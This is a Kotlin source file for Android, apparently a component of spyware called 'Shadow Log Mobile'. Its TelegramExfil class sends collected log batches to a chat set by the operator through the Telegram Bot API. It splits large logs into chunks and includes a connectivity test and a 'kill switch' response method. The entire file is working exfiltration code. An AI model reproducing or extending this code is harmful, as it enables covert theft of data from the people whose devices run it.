package com.system.service.exfil

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Telegram Bot API exfiltration channel.
 * Sends log batches as Markdown-formatted messages.
 * Mirrors the desktop's syncTelegram() function.
 */
class TelegramExfil(
    private val token: String,
    private val chatId: String
) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()

    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()
    private val baseUrl get() = "https://api.telegram.org/bot$token"

    /** Send a log batch to Telegram. Returns true on success. */
    fun send(content: String): Boolean {
        if (token.isBlank() || chatId.isBlank()) return false

        return try {
            // Telegram has a 4096 char limit. Split if needed.
            val chunks = splitMessage(content, 4000)
            var allSent = true

            for (chunk in chunks) {
                val msg = "```\n$chunk\n```"
                val payload = JSONObject()
                    .put("chat_id", chatId)
                    .put("text", msg)
                    .put("parse_mode", "Markdown")

                val request = Request.Builder()
                    .url("$baseUrl/sendMessage")
                    .header("Content-Type", "application/json")
                    .post(payload.toString().toRequestBody(JSON_MEDIA))
                    .build()

                val response = client.newCall(request).execute()
                if (!response.isSuccessful) {
                    allSent = false
                    response.close()
                    break
                }
                response.close()
                if (chunks.size > 1) Thread.sleep(500)
            }
            allSent
        } catch (_: Exception) {
            false
        }
    }

    /** Send a test message to verify Telegram connectivity. */
    fun sendTest(): Boolean {
        return try {
            val payload = JSONObject()
                .put("chat_id", chatId)
                .put("text", "🟢 *Shadow Log Mobile* Connectivity Test\n\n• *Status*: Operational\n• *Platform*: Android")
                .put("parse_mode", "Markdown")

            val request = Request.Builder()
                .url("$baseUrl/sendMessage")
                .header("Content-Type", "application/json")
                .post(payload.toString().toRequestBody(JSON_MEDIA))
                .build()

            val response = client.newCall(request).execute()
            val success = response.isSuccessful
            response.close()
            success
        } catch (_: Exception) {
            false
        }
    }

    /** Send a response message (used by kill switch). */
    fun sendResponse(text: String) {
        try {
            val payload = JSONObject()
                .put("chat_id", chatId)
                .put("text", text)
                .put("parse_mode", "Markdown")

            val request = Request.Builder()
                .url("$baseUrl/sendMessage")
                .header("Content-Type", "application/json")
                .post(payload.toString().toRequestBody(JSON_MEDIA))
                .build()

            client.newCall(request).execute().close()
        } catch (_: Exception) { }
    }

    private fun splitMessage(s: String, maxLen: Int): List<String> {
        if (s.length <= maxLen) return listOf(s)
        val chunks = mutableListOf<String>()
        var remaining = s
        while (remaining.isNotEmpty()) {
            if (remaining.length <= maxLen) {
                chunks.add(remaining)
                break
            }
            var idx = remaining.lastIndexOf('\n', maxLen)
            if (idx <= 0) idx = maxLen
            chunks.add(remaining.substring(0, idx))
            remaining = remaining.substring(idx).trimStart('\n')
        }
        return chunks
    }
}
